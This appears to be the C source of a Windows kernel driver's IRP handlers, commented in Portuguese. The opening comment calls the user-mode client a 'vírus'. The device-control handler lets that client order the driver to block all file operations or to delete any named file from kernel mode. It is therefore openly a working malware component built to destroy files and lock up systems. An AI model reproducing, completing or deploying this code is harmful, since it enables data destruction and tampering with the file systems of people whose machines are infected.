/*

	Aqui, são as operações de IRP
	Quando o user-mode precisar de alguma coisa
	A função será passada para este arquivo
	
	Aqui é a comunicação entre o user-mode (vírus) e o kernel

*/

/// <summary>
/// Sempre que um IRP é criado, ele obtém um identificador (como uma chave única)
/// Assim, é necessário criar um, para o driver quem enviou, quando fechar e etc
/// </summary>
/// <param name="DeviceObject"></param>
/// <param name="Irp"></param>
/// <returns></returns>
NTSTATUS MessageCreated(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	// Complete o IRP
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

/// <summary>
/// Quando uma mensagem é recebida do user-mode, ele vai processar e ver
/// Exatamente o que o user-mode precisa
/// </summary>
/// <param name="DeviceObject"></param>
/// <param name="Irp"></param>
/// <returns></returns>
NTSTATUS MessageReceived(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	// PIO
	PIO_STACK_LOCATION Io = IoGetCurrentIrpStackLocation(Irp);

	// Mensagem para retornar ao user-mode
	CHAR* StatusString = "fail!";

	// Mensagem do user-mode
	PCHAR UserModeMsg = (PCHAR)Irp->AssociatedIrp.SystemBuffer;

	// Quantidade de tamanho para enviar ao user-mode
	// Com 10, permite que enviemos a mensagem para o user-mode com sucesso
	Irp->IoStatus.Information = 10;
	
	// Se for para bloquear todas as operações de arquivo
	if (Io->Parameters.DeviceIoControl.IoControlCode == BLOQUEAR_TUDO)
	{
		// Altere o valor de retorno
		StatusString = "success!";
		DenyAll = TRUE;
	}

	// Se for para deletar um arquivo
	else if (Io->Parameters.DeviceIoControl.IoControlCode == DELETAR_ARQUIVO)
	{

		// ANSI e UNICODE
		ANSI_STRING Ansi;
		UNICODE_STRING Unicode;

		// Inicie o ANSI com a mensagem do user-mode
		RtlInitAnsiString(&Ansi, UserModeMsg);

		// Inicie o UNICODE
		RtlAnsiStringToUnicodeString(&Unicode, &Ansi, TRUE);

		// Delete o arquivo
		DeleteFile(Unicode);

		// Se não for NULL
		if (Unicode.Buffer != NULL)
		{
			// Libere o valor alocado
			RtlFreeUnicodeString(&Unicode);
		}

		// Altere o valor de retorno
		StatusString = "success!";
	}

	// Defina o máximo de caracterias para enviar ao user-mode
	// Se não definir, o user-mode receberá "lixo"
	int MaxLengthToCopy = 6;

	if (StatusString == "success!")
	{
		// Altere o limite máximo
		MaxLengthToCopy = 9;
	}

	// Envie a mensagem ao user-mode
	RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, StatusString, MaxLengthToCopy);

	// Sucesso
	Irp->IoStatus.Status = STATUS_SUCCESS;

	// Complete a requisição
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

/// <summary>
/// Quando o user-mode finaliza um IRP, é necessário porque a "chave-única"
/// É destruida, permitindo que próximos processos façam isso
/// </summary>
/// <param name="DeviceObject"></param>
/// <param name="Irp"></param>
/// <returns></returns>
NTSTATUS MessageClosed(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
